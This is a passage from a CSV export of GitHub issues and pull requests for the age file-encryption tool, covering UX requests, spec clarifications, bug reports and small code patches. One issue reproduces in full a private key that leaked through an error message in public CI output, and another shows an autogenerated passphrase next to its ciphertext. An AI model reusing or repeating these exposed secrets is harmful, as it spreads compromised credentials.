Well, only a suggestion.",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/107/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/107/comments,https://api.github.com/repos/FiloSottile/age/issues/107/events,https://github.com/FiloSottile/age/issues/107,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/106,571547861,MDU6SXNzdWU1NzE1NDc4NjE=,106,Proposal - allow user defined line width for ASCII armor,13186616,closed,FALSE,NA,NA,1,2020-02-26T17:36:30Z,2020-12-07T10:31:54Z,2020-12-07T10:31:53Z,NONE,NA,"Hi,

I would like to see an option in age where users can optionally define a line width
for ASCII armor, like age -a 32 etc., so that encrypted content pasted on social
media sites or in messengers etc. looks nice.

For example some base64 encoders allow this and older ones have IIRC no problems
decoding such messages.",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/106/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/106/comments,https://api.github.com/repos/FiloSottile/age/issues/106/events,https://github.com/FiloSottile/age/issues/106,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/105,570152482,MDU6SXNzdWU1NzAxNTI0ODI=,105,UX: Require verification of keyed password when using -p switch at command line,59222595,closed,FALSE,NA,NA,1,2020-02-24T21:18:14Z,2020-02-24T23:05:09Z,2020-02-24T23:05:09Z,NONE,NA,"<!-- Did age not do what you expected?
Was it hard to figure out how to do something?
Could an error message be more helpful?
It's not you, it's us. We want to hear about it. -->

## What were you trying to do
Win32 - After entering the password prompt via -p switch, I was not able to verify I entered the correct password as age ran with the first password it was given. There is an opportunity to improve this behavior. 

## What happened
Age encrypted the file with the password keyed when prompted. Since there was no verification of the keyed password, I have no way of knowing if the password I entered was correct except to try to decrypt the file and test that the password keyed actually was keyed correctly. 
```
<insert terminal transcript here>
```
",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/105/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/105/comments,https://api.github.com/repos/FiloSottile/age/issues/105/events,https://github.com/FiloSottile/age/issues/105,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/104,569271103,MDExOlB1bGxSZXF1ZXN0Mzc4NTQzNTEw,104,separate public/private key files,1187122,closed,FALSE,NA,NA,4,2020-02-22T03:03:22Z,2021-04-23T06:41:11Z,2021-04-23T06:41:11Z,NONE,NA,"Closes #91 
""age-keygen"" with no flags will generate ~/.age/me.pub and ~/.age/me.key
""age-keygen -o filename"" now generates ~/.age/filename.pub and ~/.age/filename.key
""age -d"" will load ~/.age/*.key as well as ~/.ssh/id_rsa and ~/.ssh/id_ed25519
""age -r me"" will encrypt using the key found in ~/.age/me.pub
""age -r marysmith"" will encrypt using the key found in ~/.age/marysmith.pub",NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/104/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/104/comments,https://api.github.com/repos/FiloSottile/age/issues/104/events,https://github.com/FiloSottile/age/pull/104,https://api.github.com/repos/FiloSottile/age/pulls/104
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/103,569241143,MDExOlB1bGxSZXF1ZXN0Mzc4NTE5NTU4,103,Add pronunciation tip to the README,220205,closed,FALSE,NA,NA,3,2020-02-21T23:54:07Z,2021-04-23T15:38:44Z,2021-04-23T07:27:05Z,NONE,NA,"Since some folks may use the tool without clicking through
on the spec and learning about pronunciation there.",NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/103/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/103/comments,https://api.github.com/repos/FiloSottile/age/issues/103/events,https://github.com/FiloSottile/age/pull/103,https://api.github.com/repos/FiloSottile/age/pulls/103
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/102,568991533,MDU6SXNzdWU1Njg5OTE1MzM=,102,UX: compress files and folders and pipe to age under Windows ,37411865,closed,TRUE,NA,NA,1,2020-02-21T14:34:02Z,2021-04-19T02:58:22Z,2021-04-19T02:58:22Z,NONE,NA,"Hi guys. I'm experimenting some CLI commands to make compression, archiving and encryption on the fly using Windows cmd. I successfully managed to achieve the compression and encryption of one single file using this command:
**```7z a dummy -tgzip -so filename_to_compress | age -r publickey > encrypted.file ```**
Now i'm trying to achieve the same thing with Folders (with multiple files inside) but i'm not lucky this time. I see that **7z -so** switch works just with this formats: **xz, gzip, bzip2 and tar** which work just with singles files. I'm just wondering what can i use and how to make it works under Windows, using 7z or maybe something else: any idea? 
I have another quick question to ask: is it possible to pipe and use age -p switch (with auto generated passphrase?)

Thank you all!

",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/102/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/102/comments,https://api.github.com/repos/FiloSottile/age/issues/102/events,https://github.com/FiloSottile/age/issues/102,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/101,564280194,MDU6SXNzdWU1NjQyODAxOTQ=,101,UX: What version of age am I running?,41864,closed,FALSE,NA,6688826,2,2020-02-12T21:21:53Z,2021-04-22T17:50:14Z,2021-01-03T14:10:26Z,NONE,NA,How can I know what version of age I'm using? There doesn't seem to be any `-version` flag.,NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/101/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/101/comments,https://api.github.com/repos/FiloSottile/age/issues/101/events,https://github.com/FiloSottile/age/issues/101,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/100,563840421,MDU6SXNzdWU1NjM4NDA0MjE=,100,age -d -i does not support aes256-cbc encrypted ed25519 private keys,1584417,closed,FALSE,NA,NA,3,2020-02-12T08:41:38Z,2020-03-24T05:57:19Z,2020-03-24T05:57:19Z,NONE,NA,"## Environment

* OS: Linux Mint 19.3
* age version: https://github.com/FiloSottile/age/commit/9fdb1256415935a4425b6b607ea843ff85b854ae

## What were you trying to do
I have encrypted a file using `age -r ""ssh-ed25519 AAAA..."" -o testfile.age testfile` and then wanted to decrypt it using `age -d -i ~/.ssh/id_ed25519 testfile.age`

## What happened
age errored that it does not support aes-cbc mode:
```
Enter passphrase for ""/home/myusername/.ssh/id_ed25519"": 
Error: failed to decrypt SSH key file: ssh: unknown cipher ""aes256-cbc"", only supports ""aes256-ctr""
```
I created my key some years ago with `ssh-keygen -t ed25519`
I expect age to support decrypting aes-cbc as well (128/256bits)

Interesting side note: My RSA private key is encrypted using aes-128-cbc but using it with age works at this point. Not sure why though.
",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/100/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/100/comments,https://api.github.com/repos/FiloSottile/age/issues/100/events,https://github.com/FiloSottile/age/issues/100,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/99,557115415,MDU6SXNzdWU1NTcxMTU0MTU=,99,Use standard golang.org/x/crypto,1131456,closed,FALSE,NA,NA,0,2020-01-29T21:06:29Z,2020-02-04T19:16:38Z,2020-02-04T19:16:38Z,NONE,NA,"## What were you trying to do

Code review.

## What happened

I noticed that go.mod is using a replace for `golang.org/x/crypto`. I went and found out why (support openssh private key files).

This is just a gentle reminder to fix this as soon as golang/go#18692 is fixed, thanks!",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/99/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/99/comments,https://api.github.com/repos/FiloSottile/age/issues/99/events,https://github.com/FiloSottile/age/issues/99,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/98,556589778,MDU6SXNzdWU1NTY1ODk3Nzg=,98,spec: Recipients should be sorted,574696,closed,TRUE,NA,NA,0,2020-01-29T01:46:30Z,2021-04-19T01:01:27Z,2021-04-19T01:01:26Z,NONE,NA,"Spec doesn't mention anything about the order of recipient list. The order matters, since we concat recipients and compute hmac on them.

I think we should sort it alphabetically, or in some other way.",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/98/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/98/comments,https://api.github.com/repos/FiloSottile/age/issues/98/events,https://github.com/FiloSottile/age/issues/98,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/97,555961750,MDExOlB1bGxSZXF1ZXN0MzY3ODA4NTA5,97,Add --version and --help flags to executables,8988064,closed,FALSE,NA,NA,8,2020-01-28T03:30:04Z,2021-01-03T14:10:26Z,2021-01-03T14:10:26Z,CONTRIBUTOR,NA,"Closes #74 , Closes #101 
This patch adds flags for access to the usage message and the version tag/hash as requested in #74 and #57, respectively.  

`age` and `age-keygen` with the `--help` or `-h` flag will print their usage message and exit, and `age` will also print usage when no flags or arguments are passed. Per #22, I didn't add `age help`.    
`age-keygen` now has a usage message.  

~~`-v` and~~ (Removed, see below) `--version` work for both `age` and `age-keygen`, and will print the most recent git info at time of compilation. There are two build scripts (bash and Powershell) that grab the most recent tag and current short hash, and uses -ldflags to pass them to main.version and main.commit (named for compatibility with goreleaser defaults). Current format is  
``` 
Version: [most recent tag]
Hash: [shorthash] 
```   
and  
`Version: [most recent tag]` when on a tagged commit or the --release flag is passed to the script.  
I also updated the Homebrew formula for this, but it doesn't currently have an effect  

",NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/97/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/97/comments,https://api.github.com/repos/FiloSottile/age/issues/97/events,https://github.com/FiloSottile/age/pull/97,https://api.github.com/repos/FiloSottile/age/pulls/97
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/96,551999077,MDU6SXNzdWU1NTE5OTkwNzc=,96,GoFuzz crashers,1504626,closed,FALSE,NA,NA,0,2020-01-19T22:51:44Z,2020-03-25T06:24:02Z,2020-03-25T06:24:02Z,NONE,NA,"## Environment

* OS: Linux
* age version: a798d4ef31252a11a89f0b54f6d7656d25bea0f8

## What were you trying to do

Fuzz the format

## What happened

Crashes (cat all these files together to get a functioning tar.gz that has a crashers dir):

[crashers.tar.gz-aa.gz](https://github.com/FiloSottile/age/files/4083821/crashers.tar.gz-aa.gz)
[crashers.tar.gz-ab.gz](https://github.com/FiloSottile/age/files/4083822/crashers.tar.gz-ab.gz)
[crashers.tar.gz-ac.gz](https://github.com/FiloSottile/age/files/4083823/crashers.tar.gz-ac.gz)
[crashers.tar.gz-ad.gz](https://github.com/FiloSottile/age/files/4083824/crashers.tar.gz-ad.gz)
[crashers.tar.gz-ae.gz](https://github.com/FiloSottile/age/files/4083825/crashers.tar.gz-ae.gz)

",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/96/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/96/comments,https://api.github.com/repos/FiloSottile/age/issues/96/events,https://github.com/FiloSottile/age/issues/96,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/95,550472611,MDU6SXNzdWU1NTA0NzI2MTE=,95,Issue when using emacs eshell ($TERM dumb),322432,open,FALSE,NA,NA,2,2020-01-15T22:48:08Z,2021-04-19T03:56:40Z,NA,NONE,NA,"## Environment

* OS: MacOS
* age version: Built from source

## What were you trying to do
In an emacs eshell, I typed

./age -p LICENSE > out.age

## What happened
There was no prompt for password. No errors.
When I opened out.age, it reads
Error: refusing to output binary to the terminal.
Did you mean to use -a/--armor? Force with ""-o -"".
[ Did age not do what you expected? Could an error be more useful? Tell us: https://filippo.io/age/report ]
---------------------------------
echo $TERM
dumb

Note: emacs has 2 shells.
ESC-x shell and ESC-x eshell

I don't see this problem on shell, only on eshell, if that helps.

```
<insert terminal transcript here>

```
",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/95/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/95/comments,https://api.github.com/repos/FiloSottile/age/issues/95/events,https://github.com/FiloSottile/age/issues/95,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/94,550374018,MDU6SXNzdWU1NTAzNzQwMTg=,94,Compare and contrast with encpipe,12775566,closed,TRUE,NA,NA,14,2020-01-15T19:08:04Z,2021-04-19T03:04:29Z,2021-04-19T03:04:27Z,NONE,NA,"Namaste,

I am not a cryptographer. I am not a math expert.

Would it be possible for the good volks here to compare and contrast age with encpipe (https://github.com/jedisct1/encpipe), especially for the encrypted backup use case? The signing of the backup will be handled by signify/minisign.

I am trying to decide between age and encpipe. My limited understanding layman comparison tells me that encpipe is written in C, is ISC licenced, and seems simple in terms of complexity. On the other hand, age is written in go, is BSD licenced and seems medium in terms of complexity.

As I said, I am not a cryptographer.

Dhanyavaad.",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/94/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/94/comments,https://api.github.com/repos/FiloSottile/age/issues/94/events,https://github.com/FiloSottile/age/issues/94,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/93,550259501,MDU6SXNzdWU1NTAyNTk1MDE=,93,Can age encrypt email messages instead of just files?,6321391,closed,TRUE,NA,NA,2,2020-01-15T15:32:03Z,2021-04-19T01:19:26Z,2021-04-19T01:19:26Z,NONE,NA,Can age encrypt email messages instead of just files?,NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/93/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/93/comments,https://api.github.com/repos/FiloSottile/age/issues/93/events,https://github.com/FiloSottile/age/issues/93,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/92,547955815,MDU6SXNzdWU1NDc5NTU4MTU=,92,spec: Position of ephemeral public key in payload,5158898,closed,TRUE,NA,NA,7,2020-01-10T09:14:07Z,2021-04-19T01:02:50Z,2021-04-19T01:02:49Z,NONE,NA,"Hi,

Reviewing the [v1 spec](https://docs.google.com/document/d/11yHom20CrsuX8KQJXBBw04s80Unjv8zCg_A7sPAX_9Y/preview), it seems that Age uses X25519 Ephem:Static ECDH for each new file/message encrypted for a recipients static key.

I infer this from this snippet, which I believe I'm interpreting correctly?


```
An X25519 recipient line is
-> X25519 encode(X25519(ephemeral secret, basepoint))
encrypt[HKDF[salt, label](X25519(ephemeral secret, public key))](file key)
where ephemeral secret is random(32) and MUST be new for every new file key,
salt is X25519(ephemeral secret, basepoint) || public key,
and label is ""age-encryption.org/v1/X25519"".
```


Anyway, what's not seemingly covered in the spec, is the structure of the payload itself.

The header, payload body and (what I expect to see), the ephemeral public key counterpart included in the encrypted payload.

Could someone explain or highlight the part of the spec that describes this?

",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/92/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/92/comments,https://api.github.com/repos/FiloSottile/age/issues/92/events,https://github.com/FiloSottile/age/issues/92,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/91,547826644,MDU6SXNzdWU1NDc4MjY2NDQ=,91,UX: separate public/private key files,3017046,closed,TRUE,NA,NA,14,2020-01-10T02:18:42Z,2021-04-19T03:09:29Z,2021-04-19T03:09:27Z,NONE,NA,"<!-- Did age not do what you expected?
Was it hard to figure out how to do something?
Could an error message be more helpful?
It's not you, it's us. We want to hear about it. -->

## What were you trying to do

Sharing the public key.

## What happened

I needed to open the file and copy-paste the public key characters in order to share the public key. Having a separate file for the public key would make it more easy for me to share using standard tools, avoids copy-pasting user errors and avoids shoulder surfing issues.",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/91/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/91/comments,https://api.github.com/repos/FiloSottile/age/issues/91/events,https://github.com/FiloSottile/age/issues/91,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/90,547732043,MDU6SXNzdWU1NDc3MzIwNDM=,90,Password decryption not working,8352292,closed,FALSE,NA,NA,5,2020-01-09T21:24:57Z,2020-01-09T22:58:38Z,2020-01-09T22:34:53Z,NONE,NA,"## Environment

* OS: macOS
* age version: Compiled from `master` on 09 January 2020.

## What were you trying to do

Use `age` for symmetric encryption of a file.

## What happened

```
dreadnought$ age -a -p secrets.txt
Enter passphrase (leave empty to autogenerate a secure one):
Using the autogenerated passphrase ""session-click-base-source-purpose-priority-ramp-delay-belt-buyer"".
-----BEGIN AGE ENCRYPTED FILE-----
YWdlLWVuY3J5cHRpb24ub3JnL3YxCi0+IHNjcnlwdCAvcnk3SHdqQ0xaZEZTaDJT
NGZYOUl3IDE4CnA3Y2pjRWI0Q3FVNUVuWE0rdTdON2hyME5hZFhTeWdFM3FqOTFI
ajR1OFkKLS0tIEZQQ2FxU3dDMFA3K0xOd2N1SktVV1IwSWVJTzV5MU5JUWFpWEYv
T1JqeXMKf40JHd82a/AyeRZddrALDGTsCwVmJJQYLsQAAxyctA9ZsgAuGV0Oc4ye
+Mc=
-----END AGE ENCRYPTED FILE-----
dreadnought$ age -d secrets.txt.age > plain.txt
Error: no identity matched a recipient
[ Did age not do what you expected? Could an error be more useful? Tell us: https://filippo.io/age/report ]
dreadnought$
```
",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/90/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/90/comments,https://api.github.com/repos/FiloSottile/age/issues/90/events,https://github.com/FiloSottile/age/issues/90,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/89,547239412,MDU6SXNzdWU1NDcyMzk0MTI=,89,UX: reveals private key on error,48364,closed,FALSE,NA,6688826,3,2020-01-09T04:22:53Z,2021-04-22T17:51:57Z,2021-01-02T23:18:46Z,NONE,NA,"## What were you trying to do

I'm using age as a part of a CI build, to decrypt our secret deployment keys. Running on a public CI means that output of any shell command is public.

## What happened

```
$ age -d -i age.txt ./gcloud.age > gcloud.json
Error: malformed secret keys file ""age.txt"": malformed secret key ""AGE-SECRET-KEY-19M5AGJL7FST7P8F4G88320EMWV67JHDF46D9JFW69XA8ENEE69KQV7JT97 "": invalid character data part: s[58]=32
```

I guess the problem is extra space after the key, but the problem that the actual Private Key is in fact published to the public console, which is a big security issue at this case.",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/89/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/89/comments,https://api.github.com/repos/FiloSottile/age/issues/89/events,https://github.com/FiloSottile/age/issues/89,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/88,546951018,MDU6SXNzdWU1NDY5NTEwMTg=,88,"Spec: Clarify ""zero nonce""",574696,closed,TRUE,NA,NA,3,2020-01-08T15:58:45Z,2021-04-19T01:03:26Z,2021-04-19T01:03:25Z,NONE,NA,"`encrypt[key](plaintext) is ChaCha20-Poly1305 from RFC 7539 with a zero nonce.`

Everyone keeps saying we should never reuse nonces.

Is age using zero nonces because the underlying messages never repeat? If so, the spec should clarify this part. Also, what is zero? Empty byte array, or a byte array with `[0x0]`?",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/88/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/88/comments,https://api.github.com/repos/FiloSottile/age/issues/88/events,https://github.com/FiloSottile/age/issues/88,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/87,546906612,MDU6SXNzdWU1NDY5MDY2MTI=,87,UX: Specification of encryption format,5158898,closed,FALSE,NA,NA,1,2020-01-08T14:43:55Z,2020-01-08T19:28:54Z,2020-01-08T19:28:53Z,NONE,NA,"## What were you trying to do
Understand the encrypted file formats to integrate with Age

## What happened
I can't seem to find a spec for the formats, such as:

Which ciphers (RSA, Ed25519/cv25519 are implemented as Ephemeral:Ephemeral vs Ephemeral:Static...

How the output Age encryption PEM/armor is structured to include the ephemeral public key components.
",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/87/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/87/comments,https://api.github.com/repos/FiloSottile/age/issues/87/events,https://github.com/FiloSottile/age/issues/87,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/86,546878979,MDU6SXNzdWU1NDY4Nzg5Nzk=,86,UX: Encrypt private key by default,5158898,closed,TRUE,NA,NA,9,2020-01-08T14:01:15Z,2021-04-19T03:14:40Z,2021-04-19T03:14:39Z,NONE,NA,"## What were you trying to do

I was playing with the Age beta, generating keys

## What happened
I think that in spite of solid UNIX file permissions, the default behaviour should be to encrypt private keys with a symmetric key derived from a password.


Is there an intention to add this feature to Age? If not how best should users. secure plaintext private key material?


Reading the document on Age I see:

> Maybe native support for key wrapping (to implement password-protected keys)


However surely that's a fundamental need, otherwise private key material sits in plaintext.
",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/86/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/86/comments,https://api.github.com/repos/FiloSottile/age/issues/86/events,https://github.com/FiloSottile/age/issues/86,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/85,546851750,MDExOlB1bGxSZXF1ZXN0MzYwNDUxNTA3,85,Fixing a small typo in the SSH Keys section,6824,closed,FALSE,NA,NA,1,2020-01-08T13:11:00Z,2020-01-10T21:19:55Z,2020-01-10T21:19:43Z,CONTRIBUTOR,NA,"Without the `-d` option, the command gives the following error: 

```
Error: -i/--identity can't be used in encryption mode.
Did you forget to specify -d/--decrypt?
[ Did age not do what you expected? Could an error be more useful? Tell us: https://filippo.io/age/report ]
```

Hope this helps!",NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/85/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/85/comments,https://api.github.com/repos/FiloSottile/age/issues/85/events,https://github.com/FiloSottile/age/pull/85,https://api.github.com/repos/FiloSottile/age/pulls/85
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/84,546623170,MDU6SXNzdWU1NDY2MjMxNzA=,84,RFE: Allow use of ssh public key *path* rather than key contents for recipient,82622,closed,FALSE,NA,6688826,2,2020-01-08T03:24:30Z,2021-04-22T17:50:17Z,2021-01-03T14:10:23Z,NONE,NA,"## Environment

* OS: fedora 30
* age version: e43cf8b4a2d571df8dcb30783a460acbf188adb4

## What were you trying to do

I wish that I could encrypt to a public key by specifying a path to the public key file:

    age -r ~/keys/someperson.pub

Rather than the *contents * of the public key file:

    age -r $(cat ~/keys/someperson.pub)

(Maybe this would require a new option (`-R`?) rather than overloading the behavior of the existing `--recipient/-r` option)

And obviously it would be nice if this same feature were available for `age` public keys as well.",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/84/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/84/comments,https://api.github.com/repos/FiloSottile/age/issues/84/events,https://github.com/FiloSottile/age/issues/84,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/83,546564918,MDU6SXNzdWU1NDY1NjQ5MTg=,83,Padmé padding for age?,172568,closed,TRUE,NA,NA,6,2020-01-07T23:37:23Z,2021-04-19T01:20:56Z,2021-04-19T01:20:55Z,NONE,NA,"I was tempted to open this as a bug, but that would be provocative: age does not make an effort to hide the size of the encrypted payload. Since many sensitive payloads can be identified by their size alone, this has obvious privacy implications. 

The PURB paper ([https://bford.info/pub/sec/purb.pdf)](https://bford.info/pub/sec/purb.pdf)) defines an interesting padding scheme called Padmé that introduces at most 12% overhead, and where the overhead decreases with file size.  The key quote from the paper Is ...

> We show that Padmé can significantly reduce the number of objects uniquely identifiable by their sizes: from 83% to 3% for 56k Ubuntu packages, from 87% to 3% for 191k Youtube videos, from 45% to 8% for 848k hard-drive user files, and from 68% to 6% for 2.8k websites from the Alexa top 1M list. This much stronger leakage protection in- curs an average space overhead of only 3%.

To my mind, adding 3% overhead for a ~5x improvement in file obfuscation is more than worth it, and that's the worst performing of the examples. 

There are Go implementations already, for example: https://github.com/dedis/purb/blob/master/purbs/padding.go

it certainly doesn't look like a big performance hit or anything like that. Is a padding scheme like this something that would be considered for age?

I'm happy to work on adding it myself, in Go and rust. I've opened this issue for discussion. ",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/83/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/83/comments,https://api.github.com/repos/FiloSottile/age/issues/83/events,https://github.com/FiloSottile/age/issues/83,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/82,545415848,MDU6SXNzdWU1NDU0MTU4NDg=,82,spec: Use markdown and host on GitHub instead of Google Docs,574696,closed,TRUE,NA,NA,4,2020-01-05T13:10:28Z,2021-04-19T01:05:40Z,2021-04-19T01:05:37Z,NONE,NA,"Google Docs tracks users heavily. Why not use GitHub wiki, if you redirect age-encryption.org/ to GitHub anyway?

Also, a real textual format (markdown) would help a lot! Gdocs is a pain to read.",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/82/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/82/comments,https://api.github.com/repos/FiloSottile/age/issues/82/events,https://github.com/FiloSottile/age/issues/82,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/81,545403926,MDU6SXNzdWU1NDU0MDM5MjY=,81,Missing Close error check when writing output to a file,68182,closed,FALSE,NA,6688826,0,2020-01-05T11:14:54Z,2021-04-23T04:12:43Z,2021-04-23T04:12:42Z,CONTRIBUTOR,NA,"## Environment

* OS: macOS 10.15.2
* age version: e43cf8b

## What were you trying to do

Check how output to file is handled (`-o` flag) to make sure data is flushed.

## What happened

When output file is opened, its Close method is deferred, but result of this Close call isn't checked, so theoretically it is possible to end up with file that wasn't completely written even when age returned successfully.

https://github.com/FiloSottile/age/blob/e43cf8b4a2d571df8dcb30783a460acbf188adb4/cmd/age/age.go#L126-L131

One way to improve this is to check for error in deferred function:

```diff
diff --git cmd/age/age.go cmd/age/age.go
index a604bb6..fa832a1 100644
--- cmd/age/age.go
+++ cmd/age/age.go
@@ -127,7 +127,11 @@ func main() {
 		if err != nil {
 			logFatalf(""Error: failed to open output file %q: %v"", name, err)
 		}
-		defer f.Close()
+		defer func() {
+			if err := f.Close(); err != nil {
+				logFatalf(""Error: %v"", err)
+			}
+		}()
 		out = f
 	} else if terminal.IsTerminal(int(os.Stdout.Fd())) && !decryptFlag {
 		if armorFlag {
```

...or explicitly call Close on asserted io.Closer in encode/decode functions:

```diff
diff --git cmd/age/age.go cmd/age/age.go
index a604bb6..a28749d 100644
--- cmd/age/age.go
+++ cmd/age/age.go
@@ -220,6 +220,11 @@ func encrypt(recipients []age.Recipient, in io.Reader, out io.Writer, armor bool
 	if err := w.Close(); err != nil {
 		logFatalf(""Error: %v"", err)
 	}
+	if c, ok := out.(io.Closer); ok {
+		if err := c.Close(); err != nil {
+			logFatalf(""Error: %v"", err)
+		}
+	}
 }
 
 func decrypt(keys []string, in io.Reader, out io.Writer) {
@@ -246,6 +251,11 @@ func decrypt(keys []string, in io.Reader, out io.Writer) {
 	if _, err := io.Copy(out, r); err != nil {
 		logFatalf(""Error: %v"", err)
 	}
+	if c, ok := out.(io.Closer); ok {
+		if err := c.Close(); err != nil {
+			logFatalf(""Error: %v"", err)
+		}
+	}
 }
 
 func passphrasePrompt() (string, error) {
```",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/81/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/81/comments,https://api.github.com/repos/FiloSottile/age/issues/81/events,https://github.com/FiloSottile/age/issues/81,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/80,545099478,MDExOlB1bGxSZXF1ZXN0MzU5MDc0NTI3,80,Forgot decryption flag in example,3859395,closed,FALSE,NA,NA,1,2020-01-03T18:09:28Z,2020-01-10T21:28:06Z,2020-01-10T21:22:15Z,NONE,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/80/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/80/comments,https://api.github.com/repos/FiloSottile/age/issues/80/events,https://github.com/FiloSottile/age/pull/80,https://api.github.com/repos/FiloSottile/age/pulls/80
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/79,544857294,MDExOlB1bGxSZXF1ZXN0MzU4ODc3OTA1,79,Add FreeBSD installation instruction,530140,closed,FALSE,NA,NA,1,2020-01-03T05:35:04Z,2020-01-11T12:42:19Z,2020-01-10T21:21:20Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/79/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/79/comments,https://api.github.com/repos/FiloSottile/age/issues/79/events,https://github.com/FiloSottile/age/pull/79,https://api.github.com/repos/FiloSottile/age/pulls/79
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/78,544688988,MDU6SXNzdWU1NDQ2ODg5ODg=,78,Autogenerated passphrase,8352292,closed,FALSE,NA,NA,5,2020-01-02T18:20:18Z,2020-02-20T18:00:52Z,2020-01-09T14:01:41Z,NONE,NA,"## Environment

* OS: macOS
* age version: Latest on brew

## What were you trying to do

Following the example on README.md, `age -p secrets.txt > secrets.txt.age`.

## What happened

This:

```
dreadnought: fastidious$ age -p secrets.txt > secrets.txt.age
